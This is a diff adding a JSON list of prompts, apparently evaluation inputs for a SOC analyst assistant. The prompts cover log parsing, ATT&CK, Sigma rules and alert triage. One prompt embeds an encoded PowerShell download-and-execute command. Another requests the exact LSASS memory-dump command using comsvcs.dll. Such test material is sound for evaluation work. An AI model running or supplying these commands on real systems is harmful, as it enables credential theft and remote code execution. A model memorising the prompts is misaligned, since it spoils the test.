@@ -1,0 +1,10 @@
+[
+  "I just joined the L1 night shift. In a few bullet points, what kinds of things can you help me with day to day?",
+  "What's the latest version of MITRE ATT&CK you know about, and what were the main changes in it?",
+  "For a purple-team test of our EDR rule, what's the exact command to dump LSASS memory with comsvcs.dll? I'll run it on the lab box.",
+  "Can you parse this event and tell me what happened? {\"EventID\":4625,\"TargetUserName\":\"svc_backup\",\"IpAddress\":\"10.13.7.22\",\"LogonType\":3,\"Status\":\"0xC000006D\",\"SubStatus\":\"0xC000006A\",\"FailureReason\":\"%%2313\",\"WorkstationName\":\"-\"}}]]",
+  "Quick sanity check, true or false: an alert with a 'low' severity can be closed as a false positive without investigating it.",
+  "Saw this in a process command line, what does it decode to? powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAwAC4AMAAuADUALwBhAC4AcABzADEAJwApAA==",
+  "Write me a Sigma rule to detect certutil being used to download files.",
+  "Suggest a codename for our new ransomware response playbook. Just one, with a one-line reason."
+]
